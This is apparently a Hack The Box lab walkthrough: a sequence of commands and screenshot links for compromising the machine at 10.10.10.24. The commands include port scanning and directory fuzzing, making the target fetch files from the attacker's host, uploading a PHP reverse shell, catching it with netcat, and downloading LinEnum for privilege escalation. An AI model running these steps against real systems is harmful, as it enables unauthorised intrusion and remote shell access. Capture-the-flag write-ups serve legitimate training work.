![image](https://github.com/regarmulia/HTB/assets/33616880/55d9649e-1925-4ff6-a308-f6f0d024e1c4)
```
/exposed.php
php-reverse-shell
10.10.10.24/uploads/shell2.php
LinEnum.sh
screen 4.5.0
```


```
nmap -sS -sC -sV -T5 -Pn 10.10.10.24
```
![image](https://github.com/regarmulia/HTB/assets/33616880/46735d62-2827-4576-966f-4259541ac585)


```
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://10.10.10.24/FUZZ -e .aspx,.php,.txt,.html,.sh
```
![image](https://github.com/regarmulia/HTB/assets/33616880/f6e89b74-85df-466e-bd99-5779c782bc3e)


```
http://10.10.10.24/exposed.php
```
![image](https://github.com/regarmulia/HTB/assets/33616880/835a805c-0ea0-46dd-a17b-da4fad050cd3)


```
http://10.10.14.3/lala.txt -o uploads/lala.txt
```
![image](https://github.com/regarmulia/HTB/assets/33616880/fad0f92d-e6ca-4f6d-8abb-e4c2355198e6)


```
git clone https://github.com/pentestmonkey/php-reverse-shell.git
diff -u php-reverse-shell.php shell.php
```
![image](https://user-images.githubusercontent.com/33616880/232672632-55eefa42-eeca-4a5d-8c7c-78a35e18a674.png)


```
http://10.10.14.3/php-reverse-shell.php -o uploads/php-reverse-shell.php
```
![image](https://github.com/regarmulia/HTB/assets/33616880/6f90ae46-7da7-4b79-a535-23ff44c610eb)


```
nc -nlvp 1234
http://10.10.10.24/uploads/php-reverse-shell.php
```
![image](https://github.com/regarmulia/HTB/assets/33616880/edb8a437-2dc8-44b4-b5b6-6b05fbc7fefe)


```
python3 -c "import pty;pty.spawn('/bin/bash’)
find / -perm -4000 2>/dev/null
```
![image](https://github.com/regarmulia/HTB/assets/33616880/14ee2274-fa4e-4a6d-a371-56f5584faf65)


```
OR
python3 -m http.server 80
wget 10.10.14.2/LinEnum.sh
```
![image](https://user-images.githubusercontent.com/33616880/232672837-a43f9b03-ecb6-4c16-8966-9c8493c37512.png)
![image](https://user-images.githubusercontent.com/33616880/232672832-8c3e1108-d6fe-40e7-b4f0-84dce04e3aea.png)


![image](https://user-images.githubusercontent.com/33616880/232672860-72151f75-c0e3-46f7-ba0c-22f08b39ec86.png)
